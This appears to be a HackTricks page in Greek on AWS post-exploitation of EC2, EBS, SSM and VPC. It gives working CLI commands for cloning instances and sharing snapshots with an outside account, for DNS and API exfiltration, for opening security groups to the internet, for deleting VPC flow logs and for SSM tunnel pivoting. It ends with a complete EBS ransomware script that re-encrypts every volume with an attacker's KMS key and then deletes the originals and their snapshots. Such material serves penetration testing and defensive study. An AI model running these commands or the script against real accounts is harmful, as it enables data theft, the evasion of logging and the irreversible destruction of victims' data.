# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Για περισσότερες πληροφορίες ελέγξτε:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Κακόβουλο VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

Η αναπαραγωγή της κίνησης VPC **αντιγράφει την εισερχόμενη και εξερχόμενη κίνηση για τις EC2 περιπτώσεις εντός ενός VPC** χωρίς την ανάγκη εγκατάστασης οτιδήποτε στις ίδιες τις περιπτώσεις. Αυτή η αντιγραμμένη κίνηση θα αποστέλλεται συνήθως σε κάτι όπως ένα σύστημα ανίχνευσης δικτυακής εισβολής (IDS) για ανάλυση και παρακολούθηση.\
Ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί αυτό για να συλλάβει όλη την κίνηση και να αποκτήσει ευαίσθητες πληροφορίες από αυτήν:

Για περισσότερες πληροφορίες ελέγξτε αυτή τη σελίδα:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Αντιγραφή Εκτελούμενης Περίπτωσης

Οι περιπτώσεις συνήθως περιέχουν κάποιο είδος ευαίσθητης πληροφορίας. Υπάρχουν διάφοροι τρόποι για να εισέλθετε (ελέγξτε [tricks ανύψωσης προνομίων EC2](../../aws-privilege-escalation/aws-ec2-privesc.md)). Ωστόσο, ένας άλλος τρόπος για να ελέγξετε τι περιέχει είναι να **δημιουργήσετε ένα AMI και να εκτελέσετε μια νέα περίπτωση (ακόμα και στον δικό σας λογαριασμό) από αυτό**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Τα snapshots είναι αντίγραφα ασφαλείας των όγκων**, τα οποία συνήθως θα περιέχουν **ευαίσθητες πληροφορίες**, επομένως η εξέτασή τους θα πρέπει να αποκαλύψει αυτές τις πληροφορίες.\
Αν βρείτε έναν **όγκο χωρίς snapshot** μπορείτε να: **Δημιουργήσετε ένα snapshot** και να εκτελέσετε τις παρακάτω ενέργειες ή απλά να **τον προσαρτήσετε σε μια παρουσία** μέσα στον λογαριασμό:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Ακόμα και αν κλειδώσετε ένα EC2 ώστε να μην μπορεί να βγει κυκλοφορία, μπορεί ακόμα να **εξάγει μέσω DNS**.

- **Τα VPC Flow Logs δεν θα καταγράψουν αυτό**.
- Δεν έχετε πρόσβαση στα AWS DNS logs.
- Απενεργοποιήστε το αυτό ρυθμίζοντας το "enableDnsSupport" σε false με:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Ένας επιτιθέμενος θα μπορούσε να καλέσει τα API endpoints ενός λογαριασμού που ελέγχει. Το Cloudtrail θα καταγράψει αυτές τις κλήσεις και ο επιτιθέμενος θα μπορεί να δει τα εξαγόμενα δεδομένα στα logs του Cloudtrail.

### Open Security Group

Μπορείτε να αποκτήσετε περαιτέρω πρόσβαση σε υπηρεσίες δικτύου ανοίγοντας θύρες όπως αυτή:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Είναι δυνατόν να εκτελέσετε μια EC2 instance και να την καταχωρήσετε για να χρησιμοποιηθεί για την εκτέλεση ECS instances και στη συνέχεια να κλέψετε τα δεδομένα των ECS instances.

Για [**περισσότερες πληροφορίες ελέγξτε αυτό**](../../aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Απαιτούμενες άδειες:

- `ssm:StartSession`

Εκτός από την εκτέλεση εντολών, το SSM επιτρέπει τη σήραγγα κυκλοφορίας, η οποία μπορεί να καταχραστεί για να γίνει pivot από EC2 instances που δεν έχουν πρόσβαση στο δίκτυο λόγω Security Groups ή NACLs. Ένα από τα σενάρια όπου αυτό είναι χρήσιμο είναι το pivoting από ένα [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) σε ένα ιδιωτικό EKS cluster.

> Για να ξεκινήσετε μια συνεδρία, χρειάζεστε το SessionManagerPlugin εγκατεστημένο: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Εγκαταστήστε το SessionManagerPlugin στον υπολογιστή σας
2. Συνδεθείτε στο Bastion EC2 χρησιμοποιώντας την παρακάτω εντολή:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Πάρτε τα προσωρινά διαπιστευτήρια Bastion EC2 AWS με το [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#abusing-ssrf-in-aws-ec2-environment) script  
4. Μεταφέρετε τα διαπιστευτήρια στον δικό σας υπολογιστή στο αρχείο `$HOME/.aws/credentials` ως προφίλ `[bastion-ec2]`  
5. Συνδεθείτε στο EKS ως Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Ενημερώστε το πεδίο `server` στο αρχείο `$HOME/.kube/config` ώστε να δείχνει στο `https://localhost`  
7. Δημιουργήστε ένα SSM τούνελ ως εξής:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Η κίνηση από το εργαλείο `kubectl` προωθείται τώρα μέσω της σήραγγας SSM μέσω του Bastion EC2 και μπορείτε να αποκτήσετε πρόσβαση στο ιδιωτικό EKS cluster από το μηχάνημά σας εκτελώντας:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Σημειώστε ότι οι συνδέσεις SSL θα αποτύχουν εκτός αν ορίσετε την επιλογή `--insecure-skip-tls-verify` (ή την αντίστοιχη στα εργαλεία ελέγχου K8s). Δεδομένου ότι η κίνηση είναι τούνελ μέσω της ασφαλούς σήραγγας AWS SSM, είστε ασφαλείς από οποιοδήποτε είδος επιθέσεων MitM.

Τέλος, αυτή η τεχνική δεν είναι συγκεκριμένη για επιθέσεις σε ιδιωτικά EKS clusters. Μπορείτε να ορίσετε αυθαίρετους τομείς και θύρες για να μεταβείτε σε οποιαδήποτε άλλη υπηρεσία AWS ή σε μια προσαρμοσμένη εφαρμογή.

### Share AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Αναζήτηση ευαίσθητων πληροφοριών σε δημόσιες και ιδιωτικές AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): Το CloudShovel είναι ένα εργαλείο σχεδιασμένο για **να αναζητά ευαίσθητες πληροφορίες εντός δημόσιων ή ιδιωτικών Amazon Machine Images (AMIs)**. Αυτοματοποιεί τη διαδικασία εκκίνησης στιγμιότυπων από στοχευμένες AMIs, τοποθέτησης των τόμων τους και σάρωσης για πιθανά μυστικά ή ευαίσθητα δεδομένα.

### Κοινή χρήση EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Μια απόδειξη της έννοιας παρόμοια με την επίδειξη Ransomware που παρουσιάστηκε στις σημειώσεις post-exploitation S3. Το KMS θα έπρεπε να μετονομαστεί σε RMS για Ransomware Management Service με το πόσο εύκολο είναι να χρησιμοποιηθεί για την κρυπτογράφηση διαφόρων υπηρεσιών AWS χρησιμοποιώντας το.

Πρώτα από έναν λογαριασμό AWS 'επιτιθέμενου', δημιουργήστε ένα κλειδί διαχείρισης πελάτη στο KMS. Για αυτό το παράδειγμα, θα αφήσουμε το AWS να διαχειριστεί τα δεδομένα του κλειδιού για μένα, αλλά σε ένα ρεαλιστικό σενάριο, ένας κακόβουλος παράγοντας θα διατηρούσε τα δεδομένα του κλειδιού εκτός του ελέγχου του AWS. Αλλάξτε την πολιτική του κλειδιού για να επιτρέψετε σε οποιονδήποτε Principal λογαριασμού AWS να χρησιμοποιήσει το κλειδί. Για αυτή την πολιτική κλειδιού, το όνομα του λογαριασμού ήταν 'AttackSim' και ο κανόνας πολιτικής που επιτρέπει σε όλους την πρόσβαση ονομάζεται 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Η πολιτική κλειδιού χρειάζεται τα εξής ενεργοποιημένα για να επιτρέψει τη δυνατότητα χρήσης της για κρυπτογράφηση ενός EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Τώρα με το δημόσια προσβάσιμο κλειδί προς χρήση. Μπορούμε να χρησιμοποιήσουμε έναν λογαριασμό 'θύμα' που έχει μερικές EC2 περιπτώσεις ενεργοποιημένες με μη κρυπτογραφημένα EBS volumes συνδεδεμένα. Τα EBS volumes του λογαριασμού 'θύμα' είναι αυτά που στοχεύουμε για κρυπτογράφηση, αυτή η επίθεση είναι υπό την υποτιθέμενη παραβίαση ενός λογαριασμού AWS υψηλής προνομιακής πρόσβασης.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Παρόμοια με το παράδειγμα ransomware S3. Αυτή η επίθεση θα δημιουργήσει αντίγραφα των συνδεδεμένων EBS volumes χρησιμοποιώντας snapshots, θα χρησιμοποιήσει το δημόσια διαθέσιμο κλειδί από τον λογαριασμό 'επιτιθέμενος' για να κρυπτογραφήσει τα νέα EBS volumes, στη συνέχεια θα αποσυνδέσει τα αρχικά EBS volumes από τις EC2 περιπτώσεις και θα τα διαγράψει, και τέλος θα διαγράψει τα snapshots που χρησιμοποιήθηκαν για τη δημιουργία των νεοκρυπτογραφημένων EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Αυτό έχει ως αποτέλεσμα να παραμείνουν διαθέσιμα μόνο κρυπτογραφημένα EBS volumes στον λογαριασμό.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Επίσης αξίζει να σημειωθεί ότι το σενάριο σταμάτησε τις EC2 περιπτώσεις για να αποσυνδέσει και να διαγράψει τα αρχικά EBS volumes. Τα αρχικά μη κρυπτογραφημένα volumes έχουν φύγει τώρα.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Στη συνέχεια, επιστρέψτε στην πολιτική κλειδιού στον λογαριασμό 'επιτιθέμενος' και αφαιρέστε τον κανόνα πολιτικής 'Εξωτερική Κρυπτογράφηση' από την πολιτική κλειδιού.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Περίμενε λίγο για να διαδοθεί η νέα πολιτική κλειδιού. Στη συνέχεια, επέστρεψε στον λογαριασμό του 'θύματος' και προσπάθησε να επισυνάψεις έναν από τους νεοκρυπτογραφημένους EBS όγκους. Θα διαπιστώσεις ότι μπορείς να επισυνάψεις τον όγκο.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Αλλά όταν προσπαθήσεις να ξεκινήσεις ξανά την EC2 instance με τον κρυπτογραφημένο EBS όγκο, θα αποτύχει και θα επιστρέψει από την κατάσταση 'pending' στην κατάσταση 'stopped' για πάντα, καθώς ο επισυναπτόμενος EBS όγκος δεν μπορεί να αποκρυπτογραφηθεί χρησιμοποιώντας το κλειδί, καθώς η πολιτική κλειδιού δεν το επιτρέπει πλέον.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Αυτό είναι το python script που χρησιμοποιείται. Παίρνει AWS creds για έναν λογαριασμό 'θύματος' και μια δημόσια διαθέσιμη τιμή AWS ARN για το κλειδί που θα χρησιμοποιηθεί για την κρυπτογράφηση. Το script θα δημιουργήσει κρυπτογραφημένα αντίγραφα ΟΛΩΝ των διαθέσιμων EBS όγκων που είναι επισυναπτόμενοι σε ΟΛΕΣ τις EC2 instances στον στοχευμένο λογαριασμό AWS, στη συνέχεια θα σταματήσει κάθε EC2 instance, θα αποσυνδέσει τους αρχικούς EBS όγκους, θα τους διαγράψει και τελικά θα διαγράψει όλα τα snapshots που χρησιμοποιήθηκαν κατά τη διαδικασία. Αυτό θα αφήσει μόνο κρυπτογραφημένους EBS όγκους στον στοχευμένο λογαριασμό 'θύματος'. ΧΡΗΣΙΜΟΠΟΙΗΣΕ ΑΥΤΟ ΤΟ SCRIPT ΜΟΝΟ ΣΕ ΠΕΡΙΒΑΛΛΟΝ ΔΟΚΙΜΗΣ, ΕΙΝΑΙ ΑΠΟΤΕΛΕΣΜΑΤΙΚΟ ΚΑΙ ΘΑ ΔΙΑΓΡΑΨΕΙ ΟΛΟΥΣ ΤΟΥΣ ΑΡΧΙΚΟΥΣ EBS ΟΓΚΟΥΣ. Μπορείς να τους ανακτήσεις χρησιμοποιώντας το χρησιμοποιούμενο KMS κλειδί και να τους επαναφέρεις στην αρχική τους κατάσταση μέσω snapshots, αλλά θέλω απλώς να σε ενημερώσω ότι αυτό είναι ένα ransomware PoC στο τέλος της ημέρας.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
{{#include ../../../../banners/hacktricks-training.md}}
